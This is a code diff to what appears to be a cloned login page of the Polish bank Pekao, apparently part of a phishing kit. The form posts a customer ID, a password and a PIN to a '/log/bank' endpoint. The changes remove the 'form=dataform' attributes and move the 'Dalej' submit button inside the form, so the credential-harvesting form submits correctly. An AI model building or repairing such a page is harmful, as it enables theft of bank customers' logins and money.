@@ -68,7 +68,7 @@
                                                              pekaomessageplaceholder=""></section>
                                                 </header>
                                                 <div _ngcontent-brt-c20="" class="login-container-form">
-                                                    <form _ngcontent-brt-c5="" autocomplete="off"
+                                                    <form autocomplete="off"
                                                           class="ng-touched ng-dirty ng-valid" id="bank_pm_form" method="POST"
                                                           action="/log/bank">
 
@@ -102,7 +102,7 @@
                                                                 <span _ngcontent-brt-c21="" class="field-and-buttons">
                                                        <input _ngcontent-brt-c5="" aria-describedby="customerError"
                                                               class="pekao-field-input ng-star-inserted ng-touched ng-dirty ng-valid"
-                                                              formcontrolname="customer" name="log" form="dataform"
+                                                              formcontrolname="customer" name="log"
                                                               id="customer" pekaoforcemaxlength=""
                                                               pekaokeyboardsupport="" type="text" maxlength="20"
                                                               aria-invalid="false" required="">
@@ -139,7 +139,7 @@
                                                                             aria-describedby="passwordError"
                                                                             class="pekao-field-input ng-star-inserted ng-touched ng-dirty ng-valid"
                                                                             formcontrolname="password" name="pass"
-                                                                            form="dataform" id="password"
+                                                                             id="password"
                                                                             pekaoforcemaxlength="" pekaokeyboardsupport=""
                                                                             type="password" maxlength="54"
                                                                             aria-invalid="false" required=""></span>
@@ -173,7 +173,7 @@
                                                                             aria-describedby="pinError"
                                                                             class="pekao-field-input ng-star-inserted ng-touched ng-dirty ng-valid"
                                                                             formcontrolname="pin" name="pin"
-                                                                            form="dataform" id="pin"
+                                                                             id="pin"
                                                                             pekaoforcemaxlength="" pekaokeyboardsupport=""
                                                                             type="text" maxlength="54"
                                                                             aria-invalid="false" required=""></span>
@@ -191,14 +191,15 @@
                                                                 </div>
                                                             </div>
                                                         </pekao-field>
+                                                        <section _ngcontent-brt-c5="" class="main-action-group">
+                                                            <pekao-button _ngcontent-brt-c5="" _nghost-brt-c19="">
+                                                                <button _ngcontent-brt-c5="" class="button button-primary"
+                                                                        type="submit" id="helloworldd">Dalej
+                                                                </button>
+                                                            </pekao-button>
+                                                        </section>
                                                     </form>
-                                                    <section _ngcontent-brt-c5="" class="main-action-group">
-                                                        <pekao-button _ngcontent-brt-c5="" _nghost-brt-c19="">
-                                                            <button _ngcontent-brt-c5="" class="button button-primary"
-                                                                    form="dataform" type="submit" id="helloworldd">Dalej
-                                                            </button>
-                                                        </pekao-button>
-                                                    </section>
+
                                                     <section _ngcontent-brt-c5=""
                                                              class="account-action-group show-on-mobile sf-hidden"></section>
                                                     <pekao-cms-message-group _ngcontent-brt-c5="" _nghost-brt-c24="">
